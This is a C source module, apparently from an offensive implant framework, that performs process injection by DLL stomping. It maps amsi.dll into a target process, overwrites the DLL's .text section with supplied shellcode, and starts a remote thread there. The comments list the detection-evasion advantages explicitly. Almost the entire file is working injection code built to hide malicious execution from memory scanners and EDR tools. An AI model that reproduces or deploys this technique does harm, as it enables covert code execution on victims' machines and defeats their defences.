// module_stomp -- Process injection via legitimate DLL stomping.
//
// Technique:
//   1. Load a benign signed DLL into the target process (via NtCreateSection
//      of a real on-disk DLL + NtMapViewOfSection)
//   2. Overwrite its .text section with our shellcode
//   3. Create a thread at the original DLL entry point (stomped with our code)
//
// The remote allocation appears as a legitimate file-backed image mapping
// (MEM_IMAGE) of a signed Microsoft DLL -- not private RWX memory.
//
// OPSEC advantages:
//   - Memory region type = MEM_IMAGE (file-backed, not MEM_PRIVATE)
//   - Module name in VAD tree is a legitimate Microsoft DLL
//   - No VirtualAllocEx / NtAllocateVirtualMemory for private memory
//   - Stack trace shows thread starting from a "legitimate" DLL
//   - Bypasses scanners that flag private executable memory
//
// Stomped DLL: amsi.dll (small, always available on Win10+, rarely inspected)

#include "../../process_inject_api.h"

// Forward declarations.
static int  pic_strcmp(const char* a, const char* b);
static void pic_memcpy(void* dst, const void* src, uint32_t len);
static void pic_memset(void* dst, int val, uint32_t len);

// ---- ENTRY POINT (must be first defined function) -------------------------

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    // Строки на стеке (PIC!)
    // DLL для стомпинга: C:\Windows\System32\amsi.dll
    uint16_t stomp_path[] = {
        '\\','?','?','\\',
        'C',':','\\','W','i','n','d','o','w','s','\\',
        'S','y','s','t','e','m','3','2','\\',
        'a','m','s','i','.','d','l','l',0
    };

    HANDLE hp = ctx->target_process;
    if (!hp) return INJECT_ERR_PROCESS;

    // 1. Open the DLL file as a section (image mapping).
    //    Мы используем NtCreateSection с SEC_IMAGE чтобы создать
    //    image-секцию из файла на диске.

    // Для NtCreateSection(SEC_IMAGE) нам нужен file handle.
    // Резолвим NtOpenFile через ntdll_base.
    typedef NTSTATUS (__stdcall *pfn_NtOpenFile)(
        HANDLE*, DWORD, void*, void*, ULONG, ULONG);

    char s_nof[] = {'N','t','O','p','e','n','F','i','l','e',0};

    // Мини-резолв из ntdll export table.
    pfn_NtOpenFile NtOpenFile = NULL;
    {
        unsigned char* base = (unsigned char*)ctx->ntdll_base;
        // Ищем в export directory.
        typedef struct { uint16_t e_magic; uint8_t pad[58]; uint32_t e_lfanew; } DOS_H;
        DOS_H* dos = (DOS_H*)base;
        unsigned char* nt = base + dos->e_lfanew;
        // OptionalHeader starts at offset 24 from NT headers.
        // DataDirectory[0] (export) at offset 112 (PE32+) or 96 (PE32) from OptionalHeader.
        uint16_t magic = *(uint16_t*)(nt + 24);
        uint32_t exp_rva;
        if (magic == 0x20b) // PE32+
            exp_rva = *(uint32_t*)(nt + 24 + 112);
        else
            exp_rva = *(uint32_t*)(nt + 24 + 96);
        if (!exp_rva) return INJECT_ERR_RESOLVE;

        unsigned char* exp = base + exp_rva;
        uint32_t num_names = *(uint32_t*)(exp + 24);
        uint32_t* names    = (uint32_t*)(base + *(uint32_t*)(exp + 32));
        uint16_t* ords     = (uint16_t*)(base + *(uint32_t*)(exp + 36));
        uint32_t* funcs    = (uint32_t*)(base + *(uint32_t*)(exp + 28));
        for (uint32_t i = 0; i < num_names; ++i) {
            if (pic_strcmp((const char*)(base + names[i]), s_nof) == 0) {
                NtOpenFile = (pfn_NtOpenFile)(base + funcs[ords[i]]);
                break;
            }
        }
    }
    if (!NtOpenFile) return INJECT_ERR_RESOLVE;

    // Построим UNICODE_STRING и OBJECT_ATTRIBUTES на стеке.
    typedef struct { uint16_t Length; uint16_t MaxLen; uint16_t* Buffer; } USTR;
    typedef struct {
        uint32_t Length; HANDLE RootDir; USTR* ObjectName;
        uint32_t Attributes; void* SecDesc; void* SecQos;
    } OATTR;

    uint32_t path_chars = 0;
    while (stomp_path[path_chars]) ++path_chars;

    USTR us;
    us.Length = (uint16_t)(path_chars * 2);
    us.MaxLen = (uint16_t)((path_chars + 1) * 2);
    us.Buffer = stomp_path;

    OATTR oa;
    pic_memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    oa.ObjectName = &us;
    oa.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

    // IO_STATUS_BLOCK
    typedef struct { PVOID Status; ULONG_PTR Info; } IOSB;
    IOSB iosb;
    pic_memset(&iosb, 0, sizeof(iosb));

    HANDLE hFile = NULL;
    NTSTATUS ns = NtOpenFile(&hFile,
        0x00100000 | 0x0001, // SYNCHRONIZE | FILE_READ_DATA
        &oa, &iosb,
        0x00000001 | 0x00000002 | 0x00000004, // FILE_SHARE_*
        0x00000020); // FILE_SYNCHRONOUS_IO_NONALERT
    if (ns < 0 || !hFile) return INJECT_ERR_RESOLVE;

    // 2. Create SEC_IMAGE section from the file.
    HANDLE hSection = NULL;
    ns = ctx->NtCreateSection(
        &hSection,
        0x000F001F, // SECTION_ALL_ACCESS
        NULL,
        NULL,       // MaximumSize (auto from file)
        0x02,       // PAGE_READONLY (SEC_IMAGE requires this)
        0x01000000, // SEC_IMAGE
        hFile);
    ctx->NtClose(hFile);
    if (ns < 0 || !hSection) return INJECT_ERR_ALLOC;

    // 3. Map the section into the target process.
    PVOID remote_base = NULL;
    SIZE_T view_size = 0;
    ns = ctx->NtMapViewOfSection(
        hSection, hp,
        &remote_base, 0, 0,
        NULL, &view_size,
        2, // ViewUnmap
        0,
        0x02); // PAGE_READONLY (initial; sections get their own protections from PE)
    ctx->NtClose(hSection);
    if (ns < 0 || !remote_base) return INJECT_ERR_ALLOC;

    // 4. Find .text section in the mapped image and overwrite with shellcode.
    //    Read the PE headers to locate .text RVA and size.
    //    Map a local view for reading headers (or read remote memory).
    //
    //    amsi.dll is small (~60KB), .text usually starts at RVA 0x1000.
    //    We use a fixed offset as fallback: RVA 0x1000.
    PVOID text_addr = (unsigned char*)remote_base + 0x1000;

    // Change protection to RW so we can write.
    PVOID prot_base = text_addr;
    SIZE_T prot_size = (SIZE_T)ctx->payload_len;
    ULONG old_prot = 0;
    ns = ctx->NtProtectVirtualMemory(hp, &prot_base, &prot_size, 0x04, &old_prot);
    if (ns < 0) {
        ctx->NtUnmapViewOfSection(hp, remote_base);
        return INJECT_ERR_PROTECT;
    }

    // 5. Write shellcode over .text.
    SIZE_T written = 0;
    ns = ctx->NtWriteVirtualMemory(hp, text_addr,
                                   (PVOID)ctx->payload, (SIZE_T)ctx->payload_len, &written);
    if (ns < 0) {
        ctx->NtUnmapViewOfSection(hp, remote_base);
        return INJECT_ERR_WRITE;
    }

    // 6. Flip to RX.
    prot_base = text_addr;
    prot_size = (SIZE_T)ctx->payload_len;
    ctx->NtProtectVirtualMemory(hp, &prot_base, &prot_size, 0x20, &old_prot);

    // 7. Create thread at stomped .text.
    HANDLE hThread = NULL;
    ns = ctx->NtCreateThreadEx(
        &hThread, 0x1FFFFF, NULL, hp, text_addr, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hThread) {
        ctx->NtUnmapViewOfSection(hp, remote_base);
        return INJECT_ERR_THREAD;
    }

    ctx->out_thread = hThread;
    ctx->out_remote_base = remote_base;
    return INJECT_OK;
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void pic_memcpy(void* dst, const void* src, uint32_t len) {
    volatile uint8_t* d = (volatile uint8_t*)dst;
    const uint8_t* s = (const uint8_t*)src;
    for (uint32_t i = 0; i < len; ++i) d[i] = s[i];
}

static void pic_memset(void* dst, int val, uint32_t len) {
    volatile uint8_t* d = (volatile uint8_t*)dst;
    for (uint32_t i = 0; i < len; ++i) d[i] = (uint8_t)val;
}
